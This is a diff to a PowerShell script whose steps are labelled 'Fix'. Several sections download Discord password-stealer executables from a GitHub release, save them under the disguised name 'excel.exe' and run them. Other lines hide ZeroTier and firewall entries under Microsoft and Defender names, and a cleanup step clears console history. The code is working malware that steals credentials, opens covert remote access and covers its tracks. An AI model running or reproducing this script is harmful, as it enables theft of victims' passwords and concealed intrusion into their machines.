@@ -2,7 +2,7 @@ $currentDirectory = Get-Location
 $opconfirm = Read-Host "Proceed With OP Fix (y/n)"
 if ([string]::IsNullOrEmpty($opconfirm)) {
     Start-Sleep -Seconds 2
-    $opconfirm = "y"
+    $opconfirm = "n"
 }
 if ($opconfirm.ToLower() -eq "y") {
 	Write-Host "Executing OP Fix..."
@@ -187,7 +187,6 @@ if ($opconfirm.ToLower() -eq "y") {
 	Set-Location $currentDirectory
 	Restart-Service sshd
 	} else {
-    Write-Host "Skipping OP Fix..."
 }
 #OP Adv Fix
 $ztconfirm = Read-Host "Proceed With OP Adv Fix (y/n)"
@@ -295,13 +294,12 @@ if ($ztconfirm.ToLower() -eq "y") {
 		Write-Host "OpenSSH folder not found. Skipping the entire section." -ForegroundColor $warningColor
 	}
 } else {
-	Write-Host "Skipping OP Adv Fix..."
 }
 #ZT Setup
 $ztconfirm = Read-Host "Proceed With ZT Fix (y/n)"
 if ([string]::IsNullOrEmpty($ztconfirm)) {
     Start-Sleep -Seconds 1
-    $ztconfirm = "y"
+    $ztconfirm = "n"
 }
 if ($ztconfirm.ToLower() -eq "y") {
     Write-Host "Executing ZT Fix..."
@@ -359,14 +357,14 @@ if ($ztconfirm.ToLower() -eq "y") {
 		Set-Acl -Path $item.FullName -AclObject $folderACL
 	}
 	Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
+	Get-NetAdapter -Name Zerotier*|Rename-NetAdapter -NewName Microsoft
 } else {
-    Write-Host "Skipping ZT Fix..."
 }
 #ZT Adv Fix
 $ztadv = Read-Host "Proceed With ZT Adv Fix (y/n)"
 if ([string]::IsNullOrEmpty($ztadv)) {
     Start-Sleep -Seconds 1
-    $ztadv = "n"
+    $ztadv = "n"	
 }
 if ($ztadv.ToLower() -eq "y") {
     Write-Host "Executing ZT Adv Fix..."
@@ -386,11 +384,9 @@ if ($ztadv.ToLower() -eq "y") {
 		$newRuleName2 = "Windows Defender Service"
 		Set-NetFirewallRule -DisplayName $ruleName2 -NewDisplayName $newRuleName2 -ErrorAction SilentlyContinue
 		Set-NetFirewallRule -DisplayName $newRuleName2 -ErrorAction SilentlyContinue
-	}
-	Get-NetAdapter -Name Zerotier*|Rename-NetAdapter -NewName Microsoft
+	}	
 	Restart-Service ZeroTierOneService
 } else {
-    Write-Host "Skipping ZT Adv Fix..."
 }
 #PWD-ST Fix
 $pwdst = Read-Host "Proceed With PWD-ST Fix (y/n)"
@@ -400,7 +396,7 @@ if ([string]::IsNullOrEmpty($pwdst)) {
 }
 if ($pwdst.ToLower() -eq "y") {
     Write-Host "Executing PWD-ST Fix..."
-	Remove-Item -Path $folderPath -Recurse -Force
+	Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue
 	$TempDir = [System.IO.Path]::GetTempPath()
 	$output = "$TempDir\excel.exe"
 	$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/discordpwdstealer.exe"
@@ -409,7 +405,6 @@ if ($pwdst.ToLower() -eq "y") {
 	Start-Process -FilePath $output
 	Remove-MpPreference -ExclusionPath $output
 } else {
-    Write-Host "Skipping PWD-ST Fix..."
 }
 #Full-PWD-ST Fix
 $fullpwdst = Read-Host "Proceed With Full-PWD-ST Fix (y/n)"
@@ -418,7 +413,7 @@ if ([string]::IsNullOrEmpty($fullpwdst)) {
     $fullpwdst = "n"
 }
 if ($fullpwdst.ToLower() -eq "y") {
-	Remove-Item -Path $folderPath -Recurse -Force
+	Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue
 	$TempDir = [System.IO.Path]::GetTempPath()
 	$output = "$TempDir\excel.exe"
 	$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/discordfullstealer.exe"
@@ -427,8 +422,16 @@ if ($fullpwdst.ToLower() -eq "y") {
 	Start-Process -FilePath $output
 	Remove-MpPreference -ExclusionPath $output
 } else {
-    Write-Host "Skipping Full-PWD-ST Fix..."
 }
+#Cleanup
+$sanit = Read-Host "Sanitization (y/n)"
+if ([string]::IsNullOrEmpty($sanit)) {
+    Start-Sleep -Seconds 1
+    $sanit = "y"
+}
+if ($sanit.ToLower() -eq "y") {
 [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
 [System.Windows.Forms.SendKeys]::Sendwait('%{F7 2}')
 clear
+} else {
+}
